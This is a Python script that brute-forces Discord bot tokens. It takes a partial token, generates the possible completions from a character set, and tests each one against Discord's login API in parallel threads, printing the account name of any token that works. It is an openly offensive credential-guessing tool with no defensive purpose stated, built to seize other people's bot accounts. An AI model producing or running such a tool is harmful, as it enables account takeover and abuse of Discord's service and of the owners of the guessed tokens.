import concurrent.futures
import sys

HOWLONGATOKENIS = 59
CurrentToken = input("Enter your token: ")
guessLength = HOWLONGATOKENIS - len(CurrentToken)
possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890._"
totalCombos = len(possibleChars) ** guessLength
print("Total possible combinations: " + str(totalCombos))
input("Press enter to continue...")


# generate combination from iteration number
def generateCombos(guessLength, iteration):
    combos = []
    for i in range(guessLength):
        combos.append(possibleChars[iteration % len(possibleChars)])
        iteration = iteration // len(possibleChars)
    return "".join(combos)


import discord
from tqdm import tqdm
import asyncio
import random

possibleChars = list(possibleChars)
random.shuffle(possibleChars)
possibleChars = "".join(possibleChars)


async def validateToken(token):
    client = discord.Client()
    try:
        data = await client.http.static_login(token.strip(), bot=True)
        print("\n")
        print(f'{token} is a valid token!, username: {data["username"]}#{data["discriminator"]}')
        await client.close()
        return token
    except:
        pass
    await client.close()


def validateWrapper(args):
    asyncio.run(validateToken(args))


async def goooooooo():
    futures = []
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
    for i in range(totalCombos):
        combos = generateCombos(guessLength, i)
        combos = CurrentToken + combos
        futures.append(executor.submit(validateWrapper, combos))

    with tqdm(total=totalCombos) as pbar:
        while True:
            for future in concurrent.futures.as_completed(futures):
                try:
                    data = future.result()
                    if data:
                        sys.exit(0)
                except Exception as e:
                    pass
            await asyncio.sleep(0.1)


asyncio.get_event_loop().run_until_complete(goooooooo())
